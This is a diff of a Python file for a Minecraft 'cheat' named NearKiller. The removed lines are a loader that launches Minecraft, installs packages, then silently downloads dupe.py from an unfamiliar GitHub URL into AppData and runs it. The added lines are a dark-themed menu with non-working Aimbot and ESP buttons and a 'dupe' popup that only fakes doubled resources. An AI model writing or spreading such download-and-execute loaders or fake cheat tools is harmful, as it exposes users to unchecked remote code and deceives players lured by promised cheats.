@@ -1,58 +1,81 @@
-import os
-import subprocess
-import sys
-import urllib.request
-import time
-import psutil
+import customtkinter as ctk
 
-# Путь к EXE-файлу Minecraft Launcher (укажи верный путь)
-minecraft_path = r"C:\Program Files (x86)\Minecraft Launcher\MinecraftLauncher.exe"
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("dark-blue")
 
-target_folder = os.path.join(os.getenv("APPDATA"), "NearKiller")
-os.makedirs(target_folder, exist_ok=True)
+app = ctk.CTk()
+app.geometry("400x500")
+app.title("NearKiller")
+app.wm_attributes("-topmost", True)
+app.wm_attributes("-alpha", 0.95)
 
-script_url = "https://raw.githubusercontent.com/Artesdfqa/1233213123/main/dupe.py"
-script_path = os.path.join(target_folder, "dupe.py")
+# Стили
+button_color = "#8a2be2"  # фиолетовый
+active_color = "#a259ff"
 
-def is_minecraft_running():
-    for proc in psutil.process_iter(['name']):
-        try:
-            if 'java' in proc.info['name'].lower() or 'minecraft' in proc.info['name'].lower():
-                return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            continue
-    return False
+selected_tab = ctk.StringVar(value="None")
 
-# Шаг 1: Запускаем Minecraft
-print(f"[*] Запуск Minecraft из:\n{minecraft_path}")
-try:
-    subprocess.Popen(minecraft_path)
-except Exception as e:
-    print(f"[!] Не удалось запустить Minecraft: {e}")
-    sys.exit(1)
+# Верхнее меню
+frame_top = ctk.CTkFrame(app)
+frame_top.pack(pady=10)
 
-# Шаг 2: Ждём, пока Minecraft не запустится
-print("[*] Ожидание запуска Minecraft...")
-while not is_minecraft_running():
-    print("[*] Minecraft не запущен. Повторная проверка через 5 секунд...")
-    time.sleep(5)
+def select_tab(name):
+    selected_tab.set(name)
+    update_tabs()
 
-print("[+] Minecraft запущен. Продолжаем...")
+def update_tabs():
+    for name, button in tabs.items():
+        if selected_tab.get() == name:
+            button.configure(fg_color=active_color)
+        else:
+            button.configure(fg_color=button_color)
 
-# Шаг 3: Установка зависимостей
-subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
-subprocess.call([sys.executable, "-m", "pip", "install", "customtkinter", "requests"])
+tabs = {}
+tab_names = ["Combat", "Visual", "List", "Movement", "Others"]
+for tab in tab_names:
+    tabs[tab] = ctk.CTkButton(frame_top, text=tab, command=lambda t=tab: select_tab(t), fg_color=button_color, width=70)
+    tabs[tab].pack(side="left", padx=2)
 
-# Шаг 4: Скачивание чита
-print(f"[*] Скачивание чита из: {script_url}")
-try:
-    urllib.request.urlretrieve(script_url, script_path)
-    print("[+] Файл успешно скачан.")
-except Exception as e:
-    print(f"[!] Ошибка при скачивании: {e}")
-    sys.exit(1)
+# Контент вкладок
+frame_content = ctk.CTkFrame(app)
+frame_content.pack(fill="both", expand=True, pady=10)
 
-# Шаг 5: Запуск чита
-print("[*] Запуск чита...")
-subprocess.Popen([sys.executable, script_path])
-print("[✓] Готово.")
+# Все вкладки в словаре
+tab_frames = {}
+
+def clear_frame():
+    for widget in frame_content.winfo_children():
+        widget.destroy()
+
+def show_tab(tab_name):
+    clear_frame()
+    if tab_name == "Combat":
+        ctk.CTkLabel(frame_content, text="Combat Options").pack()
+        ctk.CTkButton(frame_content, text="Aimbot").pack(pady=5)
+        ctk.CTkButton(frame_content, text="Magic Bullet").pack(pady=5)
+    elif tab_name == "Visual":
+        ctk.CTkLabel(frame_content, text="Visual Options").pack()
+        ctk.CTkButton(frame_content, text="ESP").pack(pady=5)
+        ctk.CTkButton(frame_content, text="ESP Storage").pack(pady=5)
+    elif tab_name == "Others":
+        ctk.CTkLabel(frame_content, text="Other Features").pack()
+        ctk.CTkButton(frame_content, text="x2 Dupe Resource", command=fake_dupe).pack(pady=5)
+    else:
+        ctk.CTkLabel(frame_content, text=f"{tab_name} content coming soon...").pack()
+
+# Симуляция визуального x2 дюпа
+def fake_dupe():
+    popup = ctk.CTkToplevel(app)
+    popup.title("x2 Dupe Resource")
+    popup.geometry("300x100")
+    ctk.CTkLabel(popup, text="Ресурсы теперь визуально удвоены!\n(только на экране)").pack(pady=20)
+    popup.wm_attributes("-topmost", True)
+
+# Обновление при переключении
+def on_tab_change(*args):
+    show_tab(selected_tab.get())
+
+selected_tab.trace_add("write", on_tab_change)
+select_tab("Combat")  # стартовая вкладка
+
+app.mainloop()
